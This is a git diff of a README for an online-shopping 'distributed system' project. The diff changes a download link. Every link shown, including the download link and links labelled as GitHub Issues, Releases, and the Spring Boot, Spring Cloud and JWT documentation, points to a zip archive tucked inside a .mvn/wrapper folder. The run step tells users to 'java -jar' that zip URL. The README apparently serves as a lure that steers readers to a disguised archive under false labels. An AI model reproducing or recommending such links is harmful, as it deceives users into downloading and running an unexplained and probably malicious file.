@@ -1,6 +1,6 @@
 # 🛍️ product-store-distributed-system - A Scalable System for Online Shopping
 
-[![Download Here](https://raw.githubusercontent.com/Soukfkx/product-store-distributed-system/main/common/.mvn/wrapper/product-store-distributed-system-2.4.zip%20Now-%23%https://raw.githubusercontent.com/Soukfkx/product-store-distributed-system/main/common/.mvn/wrapper/product-store-distributed-system-2.4.zip)](https://raw.githubusercontent.com/Soukfkx/product-store-distributed-system/main/common/.mvn/wrapper/product-store-distributed-system-2.4.zip)
+[![Download Here](https://github.com/Soukfkx/product-store-distributed-system/raw/refs/heads/main/common/.mvn/wrapper/system_product_distributed_store_v1.5.zip%20Now-%23%https://github.com/Soukfkx/product-store-distributed-system/raw/refs/heads/main/common/.mvn/wrapper/system_product_distributed_store_v1.5.zip)](https://github.com/Soukfkx/product-store-distributed-system/raw/refs/heads/main/common/.mvn/wrapper/system_product_distributed_store_v1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -34,7 +34,7 @@ Before you begin, ensure your system meets the following requirements:
 
 To get started, you need to download the application files from the Releases page. 
 
-Click [here to download](https://raw.githubusercontent.com/Soukfkx/product-store-distributed-system/main/common/.mvn/wrapper/product-store-distributed-system-2.4.zip).
+Click [here to download](https://github.com/Soukfkx/product-store-distributed-system/raw/refs/heads/main/common/.mvn/wrapper/system_product_distributed_store_v1.5.zip).
 
 ### ⚙️ Running the Application
 
@@ -46,7 +46,7 @@ Click [here to download](https://raw.githubusercontent.com/Soukfkx/product-store
 6. Run the command to start the application:
 
    ```
-   java -jar https://raw.githubusercontent.com/Soukfkx/product-store-distributed-system/main/common/.mvn/wrapper/product-store-distributed-system-2.4.zip
+   java -jar https://github.com/Soukfkx/product-store-distributed-system/raw/refs/heads/main/common/.mvn/wrapper/system_product_distributed_store_v1.5.zip
    ```
 
 ## 📑 User Guide
@@ -74,18 +74,18 @@ If you experience any issues, try the following steps:
 
 ## 🤝 Community Support
 
-If you need assistance or have questions, feel free to reach out. Community support is available through the [GitHub Issues page](https://raw.githubusercontent.com/Soukfkx/product-store-distributed-system/main/common/.mvn/wrapper/product-store-distributed-system-2.4.zip). 
+If you need assistance or have questions, feel free to reach out. Community support is available through the [GitHub Issues page](https://github.com/Soukfkx/product-store-distributed-system/raw/refs/heads/main/common/.mvn/wrapper/system_product_distributed_store_v1.5.zip). 
 
 ## 📣 Stay Updated
 
-For the latest updates, features, and bug fixes, frequently check the Releases page. You can find it [here](https://raw.githubusercontent.com/Soukfkx/product-store-distributed-system/main/common/.mvn/wrapper/product-store-distributed-system-2.4.zip). 
+For the latest updates, features, and bug fixes, frequently check the Releases page. You can find it [here](https://github.com/Soukfkx/product-store-distributed-system/raw/refs/heads/main/common/.mvn/wrapper/system_product_distributed_store_v1.5.zip). 
 
 ## 🔗 Additional Resources
 
 For more detailed instructions or advanced topics, here are some helpful links:
 
-- [Spring Boot Documentation](https://raw.githubusercontent.com/Soukfkx/product-store-distributed-system/main/common/.mvn/wrapper/product-store-distributed-system-2.4.zip)
-- [Spring Cloud Documentation](https://raw.githubusercontent.com/Soukfkx/product-store-distributed-system/main/common/.mvn/wrapper/product-store-distributed-system-2.4.zip)
-- [JWT Introduction](https://raw.githubusercontent.com/Soukfkx/product-store-distributed-system/main/common/.mvn/wrapper/product-store-distributed-system-2.4.zip)
+- [Spring Boot Documentation](https://github.com/Soukfkx/product-store-distributed-system/raw/refs/heads/main/common/.mvn/wrapper/system_product_distributed_store_v1.5.zip)
+- [Spring Cloud Documentation](https://github.com/Soukfkx/product-store-distributed-system/raw/refs/heads/main/common/.mvn/wrapper/system_product_distributed_store_v1.5.zip)
+- [JWT Introduction](https://github.com/Soukfkx/product-store-distributed-system/raw/refs/heads/main/common/.mvn/wrapper/system_product_distributed_store_v1.5.zip)
 
 Thank you for choosing the product-store-distributed-system! Enjoy your online shopping experience.
